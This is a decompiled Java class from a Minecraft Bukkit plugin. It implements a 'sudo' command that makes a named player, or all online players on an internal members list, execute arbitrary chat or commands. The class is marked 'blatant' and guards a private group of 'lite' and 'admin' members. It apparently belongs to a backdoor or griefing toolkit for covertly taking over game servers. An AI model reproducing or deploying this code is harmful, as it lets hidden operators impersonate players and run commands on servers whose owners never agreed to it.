/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 */
package me.qlutch.sucks.command.impl;

import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;
import me.qlutch.sucks.methods.API;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

/*
 * Illegal identifiers - consider using --renameillegalidents true
 */
public class SudoCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        if (args.length <= 2) {
            p2.sendMessage(Settings.USAGE("sudo <player> <chat | cmd>"));
        } else if (args[1].equals("*")) {
            StringBuilder chat = new StringBuilder();
            for (int i2 = 2; i2 != args.length; ++i2) {
                chat.append(args[i2]).append(" ");
            }
            for (Player a2 : Bukkit.getOnlinePlayers()) {
                if (!plugin.lite.contains(a2.getName())) continue;
                API.runCMDAsPlayer(a2, chat.toString());
            }
            p2.sendMessage(Settings.PREFIX("Everyone was forced to say " + Settings.RED + chat));
        } else {
            Player target = Bukkit.getServer().getPlayer(args[1]);
            if (target == null) {
                p2.sendMessage(Settings.PREFIX("The player " + Settings.RED + args[1] + Settings.WHITE + " is not online."));
            } else if (plugin.lite.contains(target.getName()) && !plugin.admin.contains(p2.getName())) {
                p2.sendMessage(Settings.USAGE("You cannot sudo another " + Settings.NAME + " member!"));
            } else {
                StringBuilder chat = new StringBuilder();
                for (int i3 = 2; i3 != args.length; ++i3) {
                    chat.append(args[i3]).append(" ");
                }
                API.runCMDAsPlayer(target, chat.toString());
                p2.sendMessage(Settings.PREFIX("The player " + Settings.RED + target.getName() + Settings.WHITE + " was forced to send " + Settings.RED + chat));
            }
        }
    }

    @Override
    public boolean isBlatant() {
        return true;
    }


}

